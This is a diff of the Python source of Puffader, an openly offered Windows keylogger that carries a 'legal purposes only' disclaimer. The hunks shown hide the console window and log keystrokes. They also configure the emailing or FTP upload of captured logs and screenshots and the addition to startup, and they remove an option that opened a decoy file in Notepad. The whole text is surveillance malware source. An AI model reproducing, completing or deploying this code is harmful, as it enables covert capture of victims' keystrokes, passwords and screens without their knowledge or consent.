@@ -8,7 +8,7 @@ MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE
 NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
 '''
 
-import smtplib, time, os, threading, sys, subprocess, argparse
+import smtplib, time, os, threading, sys
 import win32console, win32gui, win32event, win32api, winerror
 from sys import exit; from ftplib import FTP; from urllib2 import urlopen; from shutil import copyfile
 from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage; from _winreg import *
@@ -18,6 +18,7 @@ try:
 except ImportError:
     print("required pyhook, pywin32 and pyautogui")
     exit()
+
 
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
@@ -37,14 +38,13 @@ intTimePerSend = 120  # set how often to send/save logs in seconds
 blnStoreLocal = "False"  # True to save logs/screens locally
 strLogFile = ""  # set non-protected path to text file eg. c:/temp/test.txt
 
-blnLogClick = "False"  # for logging window clicks
-blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace
-
 blnScrShot = "False"  # set to True for capturing screenshots
 strScrDir = ""  # set non-protected dir for scrshot location if storing locally. eg c:/temp
 intScrTime = 120  # set time for taking screen in seconds
 
+blnLogClick = "False"  # for logging window clicks
 blnAddToStartup = "False"
+
 
 def hide():
     window = win32console.GetConsoleWindow()
@@ -52,14 +52,6 @@ def hide():
     return True
 # hide window as new thread. Necessary in order to define timer used later
 objTimer = threading.Timer(0, hide); objTimer.start()
-
-objParser = argparse.ArgumentParser()  # set up arg parser
-objParser.add_argument("-o", "--open", default=None)  # add args
-args = objParser.parse_args()
-
-# open file in notepad if argument is given
-if args.open:
-    OpenNotepad = subprocess.Popen([os.environ["windir"]+"\\notepad.exe", args.open])
 
 
 # function to prevent multiple instances
@@ -234,12 +226,7 @@ def OnKeyboardEvent(event):
         exit()
 
     if event.Ascii == 8:
-        if blnBackRemove == "True":
-            if not strLogs == "":
-                if intLogChars > 0:
-                    strLogs = strLogs[0:len(strLogs) - 1]
-        else:
-            strLogs = strLogs + " [BckSpace] "
+        strLogs = strLogs + " [Bck] "
     elif event.Ascii == 9:
         strLogs = strLogs + " [Tab] "
     elif event.Ascii == 13:
